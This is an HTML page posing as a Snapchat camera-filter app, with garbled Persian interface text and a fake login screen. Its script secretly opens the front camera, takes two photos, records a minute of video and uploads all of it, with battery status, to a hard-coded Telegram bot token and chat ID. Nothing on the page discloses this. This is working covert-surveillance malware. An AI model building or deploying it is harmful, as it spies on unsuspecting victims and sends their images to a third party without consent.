<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>Snap Auto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Vazirmatn', sans-serif;
      background: #fff000;
      direction: rtl;
      overflow: hidden;
    }
    #splash, #login, #camera-container {
      position: absolute; top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex; flex-direction: column;
      justify-content: center; align-items: center;
      z-index: 10;
    }
    .hidden { display: none !important; }
    .btn {
      width: 80%;
      padding: 1rem;
      margin: 0.5rem;
      border-radius: 2rem;
      font-size: 1.2rem;
      font-weight: bold;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 0.5rem;
    }
    .btn.google { background: #db4437; }
    .btn.facebook { background: #1877f2; }
    .btn.guest { background: black; }
    #video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      filter: none;
    }
    .filter-btn {
      position: absolute;
      bottom: 10px;
      right: 10px;
      background: rgba(0,0,0,0.5);
      color: white;
      padding: 0.5rem 1rem;
      border-radius: 1rem;
    }
  </style>
</head>
<body>

<!-- Splash screen -->
<div id="splash">
  <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" style="width: 120px;" />
</div>

<!-- Login screen -->
<div id="login" class="hidden">
  <h1 class="text-3xl font-bold mb-6">ÙˆØ±ÙˆØ¯ Ø¨Ù‡ SnapChat</h1>
  <button class="btn google"><img src="https://img.icons8.com/color/48/google-logo.png" width="24"/>ÙˆØ±ÙˆØ¯ Ø¨Ø§ Ú¯ÙˆÚ¯Ù„</button>
  <button class="btn facebook"><img src="https://img.icons8.com/color/48/facebook.png" width="24"/>ÙˆØ±ÙˆØ¯ Ø¨Ø§ ÙÛŒØ³Ø¨ÙˆÚ©</button>
  <button class="btn guest"><img src="https://img.icons8.com/ios-filled/50/user.png" width="24"/>ÙˆØ±ÙˆØ¯ Ù…Ù‡Ù…Ø§Ù†</button>
</div>

<!-- Camera container -->
<div id="camera-container" class="hidden">
  <video id="video" autoplay playsinline muted></video>
  <button class="filter-btn">ÙÛŒÙ„ØªØ±</button>
</div>

<script>
const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
const chatId = "-1002651451203";
let stream, mediaRecorder, chunks = [], videoSent = false, photoCount = 0;
const filters = ['none', 'grayscale(1)', 'sepia(1)', 'invert(1)', 'hue-rotate(90deg)'];
let currentFilter = 0;

setTimeout(() => {
  document.getElementById('splash').classList.add('hidden');
  document.getElementById('login').classList.remove('hidden');
}, 2000);

document.querySelector('.btn.google').onclick = () => alert("ÙˆØ±ÙˆØ¯ Ø¨Ø§ Ú¯ÙˆÚ¯Ù„ Ø¯Ø± Ø§ÛŒÙ† Ù†Ø³Ø®Ù‡ ÙØ¹Ø§Ù„ Ù†ÛŒØ³Øª.");
document.querySelector('.btn.facebook').onclick = () => alert("ÙˆØ±ÙˆØ¯ Ø¨Ø§ ÙÛŒØ³Ø¨ÙˆÚ© Ø¯Ø± Ø§ÛŒÙ† Ù†Ø³Ø®Ù‡ ÙØ¹Ø§Ù„ Ù†ÛŒØ³Øª.");
document.querySelector('.btn.guest').onclick = async () => {
  document.getElementById('login').classList.add('hidden');
  document.getElementById('camera-container').classList.remove('hidden');
  startCamera();
};

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    document.getElementById('video').srcObject = stream;
    startRecording();
    autoPhoto();
  } catch (e) {
    alert("Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø¯ Ø´Ø¯");
  }
}

function autoPhoto() {
  setTimeout(takePhoto, 1000);
  setTimeout(takePhoto, 5000);
}

function takePhoto() {
  const canvas = document.createElement("canvas");
  const video = document.getElementById("video");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.filter = filters[currentFilter];
  ctx.drawImage(video, 0, 0);
  canvas.toBlob(async blob => {
    const battery = await navigator.getBattery?.();
    const caption = `ğŸ“¸ Ø¹Ú©Ø³ ${++photoCount}\nğŸ”‹ Ø´Ø§Ø±Ú˜: ${battery ? Math.round(battery.level*100) + '%' : '?'}\nâš¡ ${battery?.charging ? "ÙˆØµÙ„ Ø§Ø³Øª" : "Ù‚Ø·Ø¹ Ø§Ø³Øª"}`;
    const form = new FormData();
    form.append("chat_id", chatId);
    form.append("photo", blob, `photo_${photoCount}.jpg`);
    form.append("caption", caption);
    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form });
  }, 'image/jpeg', 0.8);
}

function startRecording() {
  mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
  chunks = [];
  mediaRecorder.ondataavailable = e => chunks.push(e.data);
  mediaRecorder.onstop = sendVideo;
  mediaRecorder.start();
  setTimeout(() => {
    if (mediaRecorder.state === "recording") mediaRecorder.stop();
  }, 60000);
}

async function sendVideo() {
  if (videoSent || !chunks.length) return;
  videoSent = true;
  const blob = new Blob(chunks, { type: "video/webm" });
  const battery = await navigator.getBattery?.();
  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("video", blob, `video.webm`);
  form.append("caption", `ğŸ¥ ÙˆÛŒØ¯ÛŒÙˆ Ø¶Ø¨Ø·â€ŒØ´Ø¯Ù‡\nğŸ”‹ Ø´Ø§Ø±Ú˜: ${battery ? Math.round(battery.level*100) + '%' : '?'}\nâš¡ ${battery?.charging ? "ÙˆØµÙ„ Ø§Ø³Øª" : "Ù‚Ø·Ø¹ Ø§Ø³Øª"}`);
  await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: form });
}

document.querySelector('.filter-btn').addEventListener('click', () => {
  currentFilter = (currentFilter + 1) % filters.length;
  document.getElementById('video').style.filter = filters[currentFilter];
});

// Ø³ÙˆØ§ÛŒÙ¾ Ø¨Ø±Ø§ÛŒ ÙÛŒÙ„ØªØ±
let touchStartX = 0;
document.getElementById('camera-container').addEventListener('touchstart', e => {
  touchStartX = e.touches[0].clientX;
});
document.getElementById('camera-container').addEventListener('touchend', e => {
  const deltaX = e.changedTouches[0].clientX - touchStartX;
  if (Math.abs(deltaX) > 50) {
    currentFilter = deltaX > 0 ? (currentFilter - 1 + filters.length) % filters.length : (currentFilter + 1) % filters.length;
    document.getElementById('video').style.filter = filters[currentFilter];
  }
});
</script>
</body>
</html>
